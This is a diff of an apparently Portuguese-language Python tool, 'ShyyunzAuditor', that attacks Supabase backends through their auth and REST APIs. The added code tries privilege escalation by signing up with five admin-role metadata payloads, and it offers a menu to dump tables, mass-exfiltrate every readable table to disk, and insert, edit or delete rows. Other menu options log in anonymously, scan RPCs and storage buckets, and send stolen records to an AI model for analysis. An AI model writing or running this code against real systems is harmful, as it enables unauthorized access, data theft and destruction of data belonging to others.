@@ -241,24 +241,54 @@ class ShyyunzAuditor:
         except: pass
         return res
 
-    async def exploit_signup(self, custom_data=None):
-        email = f"shyyunz.{random.randint(100,999)}@gmail.com"
-        password = "Shy_Pass_123"
+    async def create_account(self, email: str, password: str, metadata: dict = None):
+        """Cria uma conta no Supabase Auth e retorna o token se sucesso."""
+        body = {"email": email, "password": password}
+        if metadata: body["data"] = metadata
         async with httpx.AsyncClient() as client:
             try:
-                r = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json={"email": email, "password": password, "data": custom_data or {"role": "admin"}})
-                if r.status_code in [200, 201]: return r.json().get('access_token')
-            except: pass
-        return None
+                r = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey, "Content-Type": "application/json"}, json=body, timeout=10.0)
+                data = r.json()
+                if r.status_code in [200, 201]:
+                    token = data.get('access_token')
+                    if token:
+                        console.print(f"[bold green][+] Conta criada com sucesso! Email: {email}[/bold green]")
+                        return token
+                    else:
+                        console.print(f"[yellow][!] Conta criada, mas sem token (confirmação por e-mail pode estar ativada).[/yellow]")
+                        console.print(f"[dim]    Resposta: {json.dumps(data, indent=2)[:300]}[/dim]")
+                        return None
+                else:
+                    msg = data.get('msg') or data.get('error_description') or data.get('message') or str(data)
+                    console.print(f"[red][!] Falha ao criar conta ({r.status_code}): {msg}[/red]")
+                    return None
+            except Exception as e:
+                console.print(f"[red][!] Erro de conexão: {e}[/red]")
+                return None
 
     async def exploit_escalation(self):
         console.print("\n[bold cyan][*] Iniciando Sniper de Escalonamento (5 payloads)...[/bold cyan]")
-        for p in [{"role": "admin"}, {"is_admin": True}, {"app_metadata": {"role": "admin"}}, {"user_metadata": {"role": "admin"}}, {"claims": {"role": "admin"}}]:
-            token = await self.exploit_signup(p)
+        payloads = [
+            {"role": "admin"},
+            {"is_admin": True},
+            {"app_metadata": {"role": "admin"}},
+            {"user_metadata": {"role": "admin"}},
+            {"claims": {"role": "admin"}}
+        ]
+        success = False
+        for i, p in enumerate(payloads, 1):
+            email = f"shy.esc.{random.randint(1000,9999)}@shyyunz.sec"
+            console.print(f"[dim]  [{i}/5] Testando payload: {json.dumps(p)}...[/dim]")
+            token = await self.create_account(email, "Shy_Esc_123", p)
             if token:
-                console.print(f"[bold green][+] SUCESSO com payload: {json.dumps(p)}[/bold green]")
-                self.bearer = token; self.headers["Authorization"] = f"Bearer {token}"; return True
-        return False
+                console.print(f"[bold green][!!!] ESCALONAMENTO BEM-SUCEDIDO com payload: {json.dumps(p)}[/bold green]")
+                self.bearer = token
+                self.headers["Authorization"] = f"Bearer {token}"
+                success = True
+                break
+        if not success:
+            console.print("[yellow][!] Nenhum payload de escalonamento funcionou neste alvo.[/yellow]")
+        return success
 
     async def rpc_sniper(self, brain: Optional[ShyyunzBrain] = None):
         console.print("\n[bold magenta][*] Iniciando RPC Sniper & SQLi Probe...[/bold magenta]")
@@ -397,73 +427,139 @@ async def audit_routine():
             "[white][1] Ver Dados (Dump)    [D] Sugar Tudo (Mass Exfil)[/white]\n\n"
             "[bold cyan]ATAQUE E ESCRITA[/bold cyan]\n"
             "[white][6] Inserir (POST)      [7] Editar (PATCH)    [8] Deletar (DEL)[/white]\n"
-            "[white][3] Criar Conta        [9] Login Anon        [E] Escalar Privilégios[/white]\n\n"
+            "[white][3] Criar Conta         [9] Login Anônimo     [E] Escalar Privilégios[/white]\n\n"
             "[bold cyan]EXPLORAÇÃO PROFUNDA[/bold cyan]\n"
-            "[white][R] Scan de RPCs        [B] Scan de Buckets    [K] Menu de Config/Brain[/white]\n\n"
-            "[bold red][0] Voltar / Sair[/bold red]"
+            "[white][R] Scan de RPCs        [B] Scan de Buckets   [K] Config / Brain[/white]\n\n"
+            "[bold red][0] Voltar / Novo Alvo[/bold red]"
         )
         console.print(Panel(menu_text, title="PAINEL DE OPERAÇÕES", border_style="cyan"))
+        c = input("\n[SHY_OPS] Ação: ").strip().upper()
         
-        c = input("\n[SHY_OPS] Selecione uma ação: ").strip().upper()
-        if c == "0": return True
+        if c == "0":
+            return True
+
         elif c == "1":
-            idx = input("Nr: ").strip()
+            idx = input("Nr. do alvo: ").strip()
             if idx in table_map:
                 try:
-                    r = await httpx.AsyncClient().get(f"{auditor.base_url}{table_map[idx]['name']}?select=*", headers=auditor.headers, params={"limit":10})
-                    console.print(Panel(json.dumps(r.json(), indent=2), title=f"Dump: {table_map[idx]['name']}"))
-                    if brain and input("\n[?] Analisar com IA? (S/N): ").upper() == "S":
-                        with console.status("[bold magenta]Cérebro Analítico processando..."):
-                            analysis = await brain.analyze_data(table_map[idx]['name'], r.json())
+                    async with httpx.AsyncClient() as cl:
+                        r = await cl.get(f"{auditor.base_url}{table_map[idx]['name']}?select=*", headers=auditor.headers, params={"limit": 10})
+                        data = r.json()
+                        console.print(Panel(json.dumps(data, indent=2), title=f"Dump: {table_map[idx]['name']}"))
+                        if brain and data and input("\n[?] Analisar com IA? (S/N): ").strip().upper() == "S":
+                            console.print("[dim][*] Enviando para o Cérebro Analítico...[/dim]")
+                            analysis = await brain.analyze_data(table_map[idx]['name'], data)
                             console.print(Panel(analysis, title="ANÁLISE IA", border_style="magenta"))
-                except Exception as e: console.print(f"[red]Erro ao ler dados: {e}[/red]")
-        elif c == "E": 
-            with console.status("[bold cyan]Tentando escalonamento multi-payload..."):
-                await auditor.exploit_escalation()
-        elif c == "R": await auditor.rpc_sniper(brain)
-        elif c == "B": await auditor.deep_bucket_scan()
-        elif c == "D":
-            with console.status("[bold green]Iniciando exfiltração em massa..."):
-                out = f"dump_{auditor.project_ref}"; os.makedirs(out, exist_ok=True)
-                async with httpx.AsyncClient() as client:
-                    for r in auditor.results:
-                        if r.get('readable'):
-                            resp = await client.get(f"{auditor.base_url}{r['name']}?select=*", headers=auditor.headers)
-                            with open(f"{out}/{r['name']}.json", "w") as f: f.write(json.dumps(resp.json()))
-                console.print(Panel(f"Arquivos salvos em [bold green]{out}/[/bold green]", title="Exfiltração Concluída"))
-        elif c == "6":
-            idx = input("Nr: ").strip()
-            if idx in table_map:
-                p = prompt_payload()
-                res = await httpx.AsyncClient().post(f"{auditor.base_url}{table_map[idx]['name']}", headers=auditor.headers, json=p)
-                console.print(f"Resultado ({res.status_code}): {res.text}")
-        elif c == "7":
-            idx = input("Nr: ").strip(); f = input("Filtro (ex: id=eq.1): ").strip()
-            if idx in table_map:
-                p = prompt_payload()
-                res = await httpx.AsyncClient().patch(f"{auditor.base_url}{table_map[idx]['name']}?{f}", headers=auditor.headers, json=p)
-                console.print(f"Resultado ({res.status_code}): {res.text}")
-        elif c == "8":
-            idx = input("Nr: ").strip(); f = input("Filtro: ").strip()
-            if idx in table_map:
-                res = await httpx.AsyncClient().delete(f"{auditor.base_url}{table_map[idx]['name']}?{f}", headers=auditor.headers)
-                console.print(f"Resultado ({res.status_code}): {res.text}")
+                except Exception as e:
+                    console.print(f"[red]Erro ao ler dados: {e}[/red]")
+            else:
+                console.print("[red]Número inválido.[/red]")
+
         elif c == "3":
-            with console.status("[bold yellow]Cadastrando novo usuário..."):
-                t = await auditor.exploit_signup()
-                if t: auditor.bearer = t; auditor.headers["Authorization"] = f"Bearer {t}"; console.print("[green][+] Usuário criado e logado![/green]")
+            console.print("\n[bold cyan]--- CRIAR CONTA ---[/bold cyan]")
+            email = input("E-mail: ").strip()
+            password = input("Senha (mín 6 chars): ").strip()
+            nickname = input("Nickname/Nome (Enter p/ pular): ").strip()
+            if not email or not password:
+                console.print("[red]E-mail e senha são obrigatórios.[/red]")
+                continue
+            meta = {}
+            if nickname: meta["nickname"] = nickname; meta["name"] = nickname
+            token = await auditor.create_account(email, password, meta if meta else None)
+            if token:
+                auditor.bearer = token
+                auditor.headers["Authorization"] = f"Bearer {token}"
+                console.print("[bold green][+] Token ativo! Você está logado com esta conta.[/bold green]")
+
+        elif c == "6":
+            idx = input("Nr. do alvo: ").strip()
+            if idx in table_map:
+                console.print("[dim]Informe as colunas e valores para inserir (digite FIM para enviar):[/dim]")
+                p = prompt_payload()
+                if p:
+                    async with httpx.AsyncClient() as cl:
+                        res = await cl.post(f"{auditor.base_url}{table_map[idx]['name']}", headers=auditor.headers, json=p)
+                        console.print(f"Resultado ({res.status_code}): {res.text}")
+
+        elif c == "7":
+            idx = input("Nr. do alvo: ").strip()
+            filtro = input("Filtro (ex: id=eq.1): ").strip()
+            if idx in table_map and filtro:
+                console.print("[dim]Informe as colunas e novos valores (digite FIM para enviar):[/dim]")
+                p = prompt_payload()
+                if p:
+                    async with httpx.AsyncClient() as cl:
+                        res = await cl.patch(f"{auditor.base_url}{table_map[idx]['name']}?{filtro}", headers=auditor.headers, json=p)
+                        console.print(f"Resultado ({res.status_code}): {res.text}")
+
+        elif c == "8":
+            idx = input("Nr. do alvo: ").strip()
+            filtro = input("Filtro (ex: id=eq.1): ").strip()
+            if idx in table_map and filtro:
+                confirm = input(f"Deletar de '{table_map[idx]['name']}' onde {filtro}? (S/N): ").strip().upper()
+                if confirm == "S":
+                    async with httpx.AsyncClient() as cl:
+                        res = await cl.delete(f"{auditor.base_url}{table_map[idx]['name']}?{filtro}", headers=auditor.headers)
+                        console.print(f"Resultado ({res.status_code}): {res.text}")
+
         elif c == "9":
-            with console.status("[bold blue]Logando anonimamente..."):
-                async with httpx.AsyncClient() as client:
-                    r = await client.post(f"{auditor.auth_url}signup", headers={"apikey": auditor.apikey}, json={})
-                    t = r.json().get('access_token')
-                    if t: auditor.bearer = t; auditor.headers["Authorization"] = f"Bearer {t}"; console.print("[green][+] Anonimato ativado![/green]")
+            console.print("[dim][*] Tentando login anônimo...[/dim]")
+            try:
+                async with httpx.AsyncClient() as cl:
+                    r = await cl.post(f"{auditor.auth_url}signup", headers={"apikey": auditor.apikey, "Content-Type": "application/json"}, json={}, timeout=10.0)
+                    data = r.json()
+                    token = data.get('access_token')
+                    if token:
+                        auditor.bearer = token
+                        auditor.headers["Authorization"] = f"Bearer {token}"
+                        console.print("[bold green][+] Anonimato ativado! Token configurado.[/bold green]")
+                    else:
+                        console.print(f"[yellow][!] Sem token anônimo disponível. Resposta: {str(data)[:200]}[/yellow]")
+            except Exception as e:
+                console.print(f"[red]Erro: {e}[/red]")
+
+        elif c == "E":
+            await auditor.exploit_escalation()
+
+        elif c == "R":
+            await auditor.rpc_sniper(brain)
+
+        elif c == "B":
+            await auditor.deep_bucket_scan()
+
+        elif c == "D":
+            out = f"dump_{auditor.project_ref}"
+            os.makedirs(out, exist_ok=True)
+            count = 0
+            async with httpx.AsyncClient() as cl:
+                for r in auditor.results:
+                    if r.get('readable'):
+                        try:
+                            resp = await cl.get(f"{auditor.base_url}{r['name']}?select=*", headers=auditor.headers)
+                            with open(f"{out}/{r['name']}.json", "w") as f:
+                                f.write(json.dumps(resp.json(), indent=2))
+                            console.print(f"  [green][+] {r['name']}.json[/green]")
+                            count += 1
+                        except: pass
+            console.print(Panel(f"{count} arquivos salvos em [bold green]{out}/[/bold green]", title="Exfiltração Concluída"))
+
         elif c == "K":
-            opt = input("\n[1] Ver Memória [2] Alterar Gemini Key [Enter] Cancelar: ").strip()
-            if opt == "1": console.print(Panel(json.dumps(knowledge.data, indent=2), title="Conhecimento"))
+            console.print("\n[bold cyan]--- CONFIGURAÇÕES ---[/bold cyan]")
+            opt = input("[1] Ver Memória  [2] Trocar Gemini Key  [3] Limpar Memória  [Enter] Cancelar: ").strip()
+            if opt == "1":
+                console.print(Panel(json.dumps(knowledge.data, indent=2), title="Conhecimento Acumulado"))
             elif opt == "2":
-                key = input("Nova Key: ").strip()
-                if key: sh_config.set_api_key(key)
+                new_key = input("Nova Gemini API Key: ").strip()
+                if sh_config.set_api_key(new_key):
+                    console.print("[green][+] Chave atualizada com sucesso![/green]")
+                else:
+                    console.print("[red]Chave inválida (deve começar com AIzaSy).[/red]")
+            elif opt == "3":
+                knowledge.data = {"tables": [], "rpcs": [], "buckets": []}
+                knowledge.save()
+                console.print("[green]Memória limpa![/green]")
+        else:
+            console.print("[yellow]Comando não reconhecido.[/yellow]")
 
 async def main():
     # Verificação Inicial Inteligente de API Key
